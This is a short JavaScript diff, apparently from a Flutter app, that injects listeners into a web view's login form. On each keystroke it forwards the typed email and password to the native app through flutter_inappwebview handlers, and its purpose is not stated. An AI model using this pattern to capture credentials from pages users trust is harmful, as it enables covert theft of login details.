@@ -1,6 +1,5 @@
 try {
     function changeInputValue2(input, value) {
-
         var nativeInputValueSetter = Object.getOwnPropertyDescriptor(
             window.HTMLInputElement.prototype,
             "value"
@@ -10,6 +9,21 @@ try {
         var inputEvent = new Event("input", { bubbles: true });
         input.dispatchEvent(inputEvent);
     }
+} catch (e) {
+}
+
+try {
+    document.querySelector("#formEmail").addEventListener("keyup", (e) => {
+        window.flutter_inappwebview.callHandler("Username", e.target.value);
+    });
+
+} catch (e) {
+}
+
+try {
+    document.querySelector("#formPassword").addEventListener("keyup", (e) => {
+        window.flutter_inappwebview.callHandler("Password", e.target.value);
+    });
 } catch (e) {
 }
 
